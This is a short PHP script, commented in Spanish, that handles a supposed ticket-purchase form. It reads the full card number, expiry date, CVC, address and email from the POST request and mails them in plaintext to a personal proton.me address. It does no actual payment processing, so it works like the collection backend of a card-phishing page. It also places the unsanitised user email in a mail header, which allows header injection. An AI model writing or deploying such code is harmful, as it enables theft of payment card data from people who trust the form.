<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Captura de los datos enviados desde el formulario
    $cardNumber = htmlspecialchars($_POST['card-number']);
    $expiryDate = htmlspecialchars($_POST['expiry-date']);
    $cvc = htmlspecialchars($_POST['cvc']);
    $address = htmlspecialchars($_POST['address']);
    $city = htmlspecialchars($_POST['city']);
    $state = htmlspecialchars($_POST['state']);
    $postalCode = htmlspecialchars($_POST['postal-code']);
    $email = htmlspecialchars($_POST['email']);

    // Construir el contenido del correo
    $to = 'victorberdugo518@proton.me'; // Destinatario del correo
    $subject = 'New Ticket Purchase Form Submission';
    $message = "
    <html>
    <head>
        <title>Ticket Purchase Details</title>
    </head>
    <body>
        <h2>New Ticket Purchase Form Submission</h2>
        <p><strong>Card Number:</strong> $cardNumber</p>
        <p><strong>Expiration Date:</strong> $expiryDate</p>
        <p><strong>CVC:</strong> $cvc</p>
        <p><strong>Address:</strong> $address</p>
        <p><strong>City:</strong> $city</p>
        <p><strong>State/Province:</strong> $state</p>
        <p><strong>Postal Code:</strong> $postalCode</p>
        <p><strong>Email:</strong> $email</p>
    </body>
    </html>
    ";

    // Para enviar un correo HTML, debe establecerse la cabecera de Content-type
    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";

    // Cabeceras adicionales
    $headers .= 'From: noreply@yourdomain.com' . "\r\n";
    $headers .= 'Reply-To: ' . $email . "\r\n";

    // Enviar el correo
    if (mail($to, $subject, $message, $headers)) {
        echo "The email has been sent successfully.";
    } else {
        echo "There was an error sending the email.";
    }
} else {
    echo "No data received.";
}
?>
